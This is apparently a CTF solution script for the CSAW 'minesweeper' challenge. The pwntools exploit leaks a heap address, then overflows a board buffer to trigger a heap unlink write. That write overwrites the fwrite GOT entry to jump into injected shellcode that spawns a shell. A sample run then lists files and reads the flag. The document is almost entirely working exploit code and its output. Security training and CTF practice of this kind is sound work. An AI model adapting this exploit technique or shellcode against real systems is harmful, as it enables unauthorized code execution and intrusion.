#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux', terminal=['tmux', 'neww'])

if args['REMOTE']:
    io = remote('pwn.chal.csaw.io', 7478)
    elf, libc = ELF('./minesweeper'), None
else:
    io = remote('localhost', 31337)
    elf, libc = ELF('./minesweeper'), None

# initialize a board and then view it to leak an heap address

io.recvuntil('3) Q (Quit)\n')
io.sendline('I')

x = 4
y = 4
io.recvuntil(
    'Please enter in the dimensions of the board you would like to set in this format: B X Y\n')
io.sendline('B {} {}'.format(x, y))
io.sendline('X' * (y * x))

io.recvuntil('3) Q (Quit)\n')
io.sendline('N')
io.recvuntil('3) Quit game (Q)\n')
io.sendline('V')

# print hexdump(io.recvall(timeout=1))
io.recvn(0x14)
an_heap_address = u32(io.recvn(0x4))  # 0x804c0f0
success('an_heap_address: %s' % hex(an_heap_address))
io.sendline('Q')

# initialize a board and overflow in the next heap chunk to trigger the classic unlink vulnerability

io.recvuntil('3) Q (Quit)\n')
io.sendline('I')

io.recvuntil(
    'Please enter in the dimensions of the board you would like to set in this format: B X Y\n')
x = 20
y = 20
io.sendline('B {} {}'.format(x, y))

got_fwrite_address = 0x804bd64
shellcode_address = an_heap_address + (0x804c0fc - 0x804c0f0)
success('shellcode_address: %s' % hex(shellcode_address))
io.sendline(
    fit({
        0: asm(
            'jmp $+0x6'
        ),  # the shellcode starts here, but we need to skip the next bytes which are overwritten by unlink
        4: 0xffffffff,
        8: asm('push 0x4; pop ebp') +
        asm(shellcraft.i386.linux.dupsh()),  # the shellcode continues here
        cyclic_find('taad'): p32(got_fwrite_address - 0x8),
        cyclic_find('uaad'): p32(shellcode_address),
        (y * x - 1): 'X'
    }))

io.interactive()

# $ ./minesweeper.py REMOTE
# [+] Opening connection to pwn.chal.csaw.io on port 7478: Done
# [*] '/home/ubuntu/vbox/minesweeper'
#     Arch:     i386-32-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX disabled
#     PIE:      No PIE (0xc01000)
#     RWX:      Has RWX segments
#     Packer:   Packed with UPX
# [+] an_heap_address: 0x93740f0
# [+] shellcode_address: 0x93740fc
# . . .
# Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X
# $ ls
# Makefile
# flag
# fork_accept.c
# malloc.c
# malloc.h
# minesweeper
# ms.c
# run.sh
# $ cat flag
# flag{h3aps4r3fun351eabf3}
